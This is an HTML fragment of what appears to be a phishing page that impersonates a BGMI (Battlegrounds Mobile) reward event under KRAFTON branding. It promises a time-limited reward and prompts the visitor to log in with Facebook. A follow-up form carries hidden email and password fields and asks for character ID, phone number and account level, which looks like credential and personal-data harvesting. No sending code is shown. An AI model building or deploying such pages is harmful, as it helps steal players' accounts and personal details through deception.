...
<div class="event-notification-content">Rewards will be available for 24 hours</div> 
</div> 
<div class="box">
<center>
...
<div class="footer-txt-copyright">ⓒ KRAFTON, Inc. All rights reserved.</div> 
...
<div style="color: black" class="popup-alert">Are you sure to collect this reward?</div> 
...
<div class="popup-box-bg">
<div style="color: black" class="popup-alerts">Log in using your BGMI MOBILE account</div> 
...
<div class="txt-login-fb">Log in to your Facebook account to connect to Battlegrounds Mobile.</div> 
...
<div class="popup-box-bg">
<div style="color: black" class="popup-alert">Complete your account details</div> 
<form class="popup-form" style="color: black" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<input style="color: black" type="number" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Character ID')" oninput="setCustomValidity('')">
<input style="color: black" type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Phone Number')" oninput="setCustomValidity('')">
<select name="level" style="color: black" id="level" required oninvalid="this.setCustomValidity('select your Account Level')" oninput="setCustomValidity('')">
...
<br>
<i style="color: black" class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
...
<div class="popup-box-bg">
<div style="color: black" class="popup-alert">
